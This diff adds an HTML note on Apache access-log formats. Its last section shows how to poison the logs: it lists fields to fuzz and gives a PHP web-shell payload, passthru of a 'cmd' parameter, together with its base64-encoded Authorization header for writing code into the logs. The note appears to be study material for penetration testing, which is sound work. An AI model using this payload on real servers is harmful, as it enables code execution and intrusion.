@@ -1,0 +1,52 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>access.log</title>
+</head><body>On most systems the apache access log is readable only by root! so take that into account. The server access log records all requests processed by the server. <br/>
+<br/>
+<b>Common Log Format</b><br/>
+A typical configuration for the access log might look as follows.<br/>
+&nbsp;LogFormat "%h %l %u %t \"%r\" %&gt;s %b" common<br/>
+&nbsp;CustomLog logs/access_log common<br/>
+<br/>
+The above configuration will write log entries in a format known as the Common Log Format (CLF). This standard format can be produced by many different web servers and read by many log analysis programs. The log file entries produced in CLF will look something like this:<br/>
+<br/>
+127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326<br/>
+<br/>
+(%h) 127.0.0.1 &#09;&#09;&#09;&#09;&#09;&#09;This is the IP address of the client<br/>
+(%l) - &#09;&#09;&#09;&#09;&#09;&#09;&#09;"hyphen" indicates the requested information is N/A<br/>
+(%u) frank&#09;&#09;&#09;&#09;&#09;&#09;&#09;userid of person requesting as determined by HTTP auth<br/>
+(%t) [10/Oct/2000:13:55:36 -0700]&#09;&#09;time of the request<br/>
+(\"%r\") GET . . . &#09;&#09;&#09;&#09;&#09;request line from the client<br/>
+(%&gt;s) 200&#09;&#09;&#09;&#09;&#09;&#09;&#09;status code sent back to client<br/>
+(%b) 2326&#09;&#09;&#09;&#09;&#09;&#09;&#09;size of object returned to the client<br/>
+<br/>
+<b>Combined Log Format</b><br/>
+Another commonly used format string is called the Combined Log Format. It can be used as follows.<br/>
+&nbsp;LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-agent}i\"" combined<br/>
+&nbsp;CustomLog log/access_log combined<br/>
+<br/>
+127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326 "http://www.example.com/start.html" "Mozilla/4.08 [en] (Win98; I ;Nav)"<br/>
+<br/>
+(\"%{Referer}i\") "example.com/start . .. "&#09;Referer HTTP request header<br/>
+(\"%{User-agent}i\") "Mozilla . . . "&#09;&#09;User-Agent HTTP Request header<br/>
+<br/>
+<br/>
+<b>Fields available to fuzz</b><br/>
+Request<br/>
+Referer<br/>
+User-Agent<br/>
+userid*&#09;&#09;&#09;&#09;&#09;&#09;&#09;if HTTP auth captures<br/>
+<br/>
+Note that logs appear to be encased in quotes, so additional escape may be required to achieve execution. <br/>
+<br/>
+To fuzz user name: This is pulled from the Authorization header which is typically base64 encoded and thereby avoids the URL encoding mechanisms. By base64 encoding a string similar to the following:<br/>
+<br/>
+&lt;?php passthru($_GET[‘cmd’]); ?&gt;:doesn’t matter<br/>
+<br/>
+And specifying an Authorization header as follows:<br/>
+<br/>
+Authorization: Basic PD9waHAgcGFzc3RocnUoJF9HRVRbJ2NtZCddKTsgPz46ZG9lc24ndCBtYXR0ZXI=<br/>
+<br/>
+We can insert arbitrary code into the HTTP logs.</body></html>
